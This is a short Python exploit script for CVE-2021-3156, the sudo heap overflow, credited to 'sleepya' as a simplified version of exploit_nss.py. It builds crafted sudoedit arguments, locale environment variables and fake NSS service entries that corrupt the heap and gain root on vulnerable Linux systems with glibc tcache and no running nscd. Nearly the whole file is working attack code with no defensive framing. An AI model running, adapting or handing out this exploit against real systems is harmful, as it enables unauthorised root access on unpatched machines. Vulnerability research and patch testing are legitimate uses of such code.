#!/usr/bin/python3
'''
Exploit for CVE-2021-3156 by sleepya

Simplified version of exploit_nss.py for easy understanding.
- Remove all checking code
- Remove embeded library
- Manual a number of services before group line

This exploit requires:
- glibc with tcache
- nscd service is not running
'''
import os

SUDO_PATH = b"/usr/bin/sudo"

def execve(filename, argv, envp):
	from ctypes import cdll, c_char_p, POINTER
	libc = cdll.LoadLibrary("libc.so.6")
	libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)
	
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(envp))(*envp)

	libc.execve(filename, cargv, cenvp)


TARGET_OFFSET_START = 0x780

FAKE_USER_SERVICE_PART = [ b"\\" ]*0x18 + [ b"X/X1234\\" ]
FAKE_USER_SERVICE = FAKE_USER_SERVICE_PART * 13
FAKE_USER_SERVICE[-1] = FAKE_USER_SERVICE[-1][:-1]  # remove last backslash

argv = [ b"sudoedit", b"-A", b"-s", b"A"*(0xe0)+b"\\", None ]

env = [ b"Z"*(TARGET_OFFSET_START + 0xf - 8 - 1) + b"\\" ] + FAKE_USER_SERVICE
env.extend([
	b"LC_CTYPE=C.UTF-8@"+b'A'*0x28+b";A=",
	b"LC_NUMERIC=C.UTF-8@"+b'A'*0xd8,
	b"LC_TIME=C.UTF-8@"+b'A'*0x28,
	b"LC_COLLATE=C.UTF-8@"+b'A'*0x28,
	#b"LC_MONETARY=C.UTF-8@"+b'A'*0x28, # for 3 entries in passwd line
	b"LC_IDENTIFICATION=C.UTF-8@"+b'A'*0x78, # for filling holes from freed file buffer
	b"TZ=:",
	None
])

execve(SUDO_PATH, argv, env)
